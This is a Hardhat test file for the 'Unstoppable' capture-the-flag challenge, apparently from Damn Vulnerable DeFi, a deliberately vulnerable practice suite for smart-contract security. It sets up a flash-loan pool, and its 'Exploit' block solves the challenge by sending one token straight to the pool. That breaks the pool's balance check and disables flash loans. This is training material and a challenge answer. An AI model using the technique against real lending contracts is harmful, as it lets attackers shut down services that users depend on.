const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('[Challenge] Unstoppable', function() {
    
    const TOKEN_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);

        // DVT approve the UnstoppableLender to spend TOKEN_IN_POOL
        await this.token.approve(this.pool.address, TOKEN_IN_POOL);
        // UnstoppableLender deposit DTV token
        await this.pool.depositTokens(TOKEN_IN_POOL);
        // DTV transfer to attacker INITIAL_ATTACKER_TOKEN_BALANCE
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(
            TOKEN_IN_POOL
        );

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(
            INITIAL_ATTACKER_TOKEN_BALANCE
        );

        await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function() {
        await this.token.transfer(this.pool.address, 1);
    });

    after(async function () {
        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});